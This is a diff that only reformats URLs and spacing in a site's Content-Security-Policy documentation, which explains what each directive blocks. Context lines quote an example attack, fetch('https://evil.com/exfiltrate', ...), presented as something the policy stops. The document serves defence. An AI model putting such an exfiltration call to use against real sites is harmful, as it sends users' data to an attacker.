@@ -36,12 +36,12 @@ Content-Security-Policy:
 
 **Purpose**: Default fallback for all resource types
 
-**Effect**: Only load resources from same origin (https://abr-insights.com)
+**Effect**: Only load resources from same origin (<https://abr-insights.com>)
 
 **Blocks**:
 
-- ❌ External scripts (https://evil.com/malicious.js)
-- ❌ External stylesheets (https://evil.com/style.css)
+- ❌ External scripts (<https://evil.com/malicious.js>)
+- ❌ External stylesheets (<https://evil.com/style.css>)
 - ❌ External images (except allowed by img-src)
 
 #### `script-src 'self' 'nonce-{RANDOM_NONCE}' 'strict-dynamic'`
@@ -101,7 +101,7 @@ Content-Security-Policy:
 
 **Blocks**:
 
-- ❌ HTTP images (http://insecure.com/image.jpg)
+- ❌ HTTP images (<http://insecure.com/image.jpg>)
 
 #### `font-src 'self' https://fonts.gstatic.com`
 
@@ -156,7 +156,7 @@ Content-Security-Policy:
 
 **Purpose**: Automatically upgrade HTTP to HTTPS
 
-**Effect**: All HTTP requests rewritten to HTTPS (http://example.com → https://example.com)
+**Effect**: All HTTP requests rewritten to HTTPS (<http://example.com> → <https://example.com>)
 
 #### `block-all-mixed-content`
 
@@ -549,7 +549,7 @@ fetch('https://evil.com/exfiltrate', {
 
 **CSP Protection**:
 
-- ❌ Blocked: `connect-src` doesn't allow https://evil.com
+- ❌ Blocked: `connect-src` doesn't allow <https://evil.com>
 - Browser console: "Refused to connect to..."
 - CSP violation report sent
 
@@ -602,7 +602,7 @@ fetch('https://evil.com/exfiltrate', {
 
 ### Security Headers Scan
 
-**Tool**: https://securityheaders.com/
+**Tool**: <https://securityheaders.com/>
 
 **Score**: A+ (target)
 
@@ -638,9 +638,11 @@ fetch('https://evil.com/exfiltrate', {
 
 1. Identify new requirement (e.g., new CDN for analytics)
 2. Update CSP directive in middleware.ts:
+
    ```typescript
    connect-src 'self' https://*.supabase.co https://analytics.example.com;
    ```
+
 3. Test in staging (verify no violations)
 4. Deploy to production
 5. Monitor CSP reports for 24 hours
